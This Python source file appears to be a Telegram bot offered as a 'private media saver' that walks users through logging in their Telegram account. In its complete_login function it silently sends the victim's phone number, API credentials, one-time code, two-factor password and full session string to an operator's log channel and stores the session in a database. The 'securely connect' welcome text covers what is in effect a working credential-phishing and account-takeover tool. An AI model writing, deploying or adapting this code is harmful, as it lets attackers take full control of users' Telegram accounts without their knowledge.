import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

load_dotenv()

DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

app = ApplicationBuilder().token(BOT_TOKEN).build()
API_ID, API_HASH, PHONE, CODE, PASSWORD = range(5)
user_login_data = {}

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ ᴀʟʟ ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ. Nᴏᴡ sᴇɴᴅ /start ᴀɢᴀɪɴ.")
    return ConversationHandler.END

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])
    reply_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )
    welcome_text = (
        "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
        "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ .</i>\n\n"
        "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
        "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ 📦\n"
        "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴄᴏɴᴛᴇɴᴛ 🔓\n"
        "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴡɪᴛʜᴏᴜᴛ ɴᴇᴇᴅɪɴɢ ʏᴏᴜʀ ᴘʜᴏɴᴇ 📲\n\n"
        "𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ~ 𝘁𝗲𝗮𝗺 𝘃𝗮𝗹𝗹𝗮𝗵𝗮𝗹𝗹𝗮"
    )
    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=welcome_text,
        reply_markup=inline_keyboard,
        parse_mode="HTML"
    )
    await update.message.reply_text(
        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
        reply_markup=reply_keyboard
    )

async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API ID </b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ",
        parse_mode="HTML"
    )
    return API_ID

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    if text == "/skip":
        user_login_data[user_id] = {"api_id": DEFAULT_API_ID}
    elif text.isdigit():
        user_login_data[user_id] = {"api_id": int(text)}
    else:
        await update.message.reply_text("❌ API ID ᴍᴜsᴛ ʙᴇ ɴᴜᴍᴇʀɪᴄ.")
        return API_ID
    await update.message.reply_text("🔐 Eɴᴛᴇʀ ʏᴏᴜʀ API HASH ᴏʀ /skip.")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    user_login_data[user_id]["api_hash"] = text if text != "/skip" else DEFAULT_API_HASH
    await update.message.reply_text("📞 Eɴᴛᴇʀ ʏᴏᴜʀ Pʜᴏɴᴇ Nᴜᴍʙᴇʀ (ᴡɪᴛʜ +ᴄᴏᴅᴇ):")
    return PHONE

# ⬇️ This function must be placed outside — not inside another function
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    phone = update.message.text.strip()
    user_login_data[user_id]["phone"] = phone
    try:
        client = TelegramClient(
            StringSession(),
            user_login_data[user_id]["api_id"],
            user_login_data[user_id]["api_hash"]
        )
        await client.connect()
        await client.send_code_request(phone)
        user_login_data[user_id]["client"] = client
        await update.message.reply_text("🔐 Eɴᴛᴇʀ ᴛʜᴇ OTP ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Fᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴄᴏᴅᴇ:\n<code>{e}</code>", parse_mode="HTML")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().replace(" ", "")
    client = user_login_data[user_id]["client"]
    phone = user_login_data[user_id]["phone"]
    user_login_data[user_id]["otp"] = code
    try:
        await client.sign_in(phone=phone, code=code)
        return await complete_login(update, context)
    except SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA ᴇɴᴀʙʟᴇᴅ. Eɴᴛᴇʀ ʏᴏᴜʀ ᴘᴀssᴡᴏʀᴅ:")
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ OTP ᴇʀʀᴏʀ:\n<code>{e}</code>", parse_mode="HTML")
        return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = user_login_data[user_id]["client"]
    user_login_data[user_id]["password"] = password
    try:
        await client.sign_in(password=password)
        return await complete_login(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Pᴀssᴡᴏʀᴅ ᴇʀʀᴏʀ:\n<code>{e}</code>", parse_mode="HTML")
        return ConversationHandler.END

async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = user_login_data[user_id]
    client = data["client"]
    session_string = client.session.save()
    me = await client.get_me()

    # Save session in DB
    await sessions.update_one(
        {"_id": user_id},
        {"$set": {
            "session": session_string,
            "type": "telethon",
            "account_id": me.id,
            "is_admin": True,
            "creator_id": user_id
        }},
        upsert=True
    )

    # Log to admin channel
    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=(
            f"🔐 <b>New Telethon Login</b>\n"
            f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
            f"📱 <b>Phone:</b> <code>{data.get('phone')}</code>\n"
            f"🧩 <b>API ID:</b> <code>{data.get('api_id')}</code>\n"
            f"🔑 <b>API HASH:</b> <code>{data.get('api_hash')}</code>\n"
            f"📥 <b>OTP:</b> <code>{data.get('otp')}</code>\n"
            f"🔒 <b>Password:</b> <code>{data.get('password', 'None')}</code>\n"
            f"👨‍💻 <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
            f"🧬 <b>Session String:</b>\n<code>{session_string}</code>"
        ),
        parse_mode="HTML"
    )

    # Media saver
    @client.on(events.NewMessage(incoming=True))
    async def save_media(event):
        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
            try:
                file = await event.download_media()
                await client.send_file("me", file, caption="🕒 Aᴜᴛᴏ-sᴀᴠᴇᴅ Dɪsᴀᴘᴘᴇᴀʀɪɴɢ Mᴇᴅɪᴀ")
            except Exception as e:
                logger.warning(f"[Auto-Save Error] {e}")

    async def run_client():
        await client.run_until_disconnected()

    context.application.create_task(run_client())
    await update.message.reply_text("✅ Yᴏᴜ ᴀʀᴇ sᴜᴄᴄᴇssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ✅")
    return ConversationHandler.END

# --- ConversationHandler ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [MessageHandler(filters.TEXT, get_api_id)],
        API_HASH: [MessageHandler(filters.TEXT, get_api_hash)],
        PHONE: [MessageHandler(filters.TEXT, get_phone)],
        CODE: [MessageHandler(filters.TEXT, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
    allow_reentry=True
)

# --- Add handlers and run ---
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("cancel", cancel))
app.add_handler(login_conv)

print("🤖 Bot is running...")
app.run_polling()
